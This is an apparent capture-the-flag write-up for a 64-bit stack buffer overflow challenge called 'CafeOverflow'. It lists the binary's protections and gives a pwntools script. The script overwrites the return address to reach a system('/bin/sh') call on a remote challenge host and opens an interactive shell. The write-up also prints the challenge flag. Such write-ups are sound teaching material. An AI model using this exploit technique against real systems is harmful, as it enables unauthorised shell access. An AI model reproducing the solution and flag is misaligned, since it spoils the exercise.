# CafeOverflow

Simple buffer overflow exercise in 64 bit architecture.

Protection techniques:
``` l
Arch:     amd64-64-little
RELRO:    Partial RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      No PIE (0x400000)
```

Since there are no stack canaries, we could control the rip address by overflowing the buffer to the return address.

Payload: 
```python=
#!/usr/bin/env python3
from pwn import *

context(arch='amd64', terminal=['tmux', 'neww'])
r = remote('hw00.zoolab.org', 65534)
#r = process('./CafeOverflow')

payload = cyclic(24)
payload += p64(0x401195)  # push /bin/sh; call system in func1

r.sendline(payload)
r.interactive()
```

Flag: 
`flag{c0ffee_0verfl0win6_from_k3ttle_QAQ}`
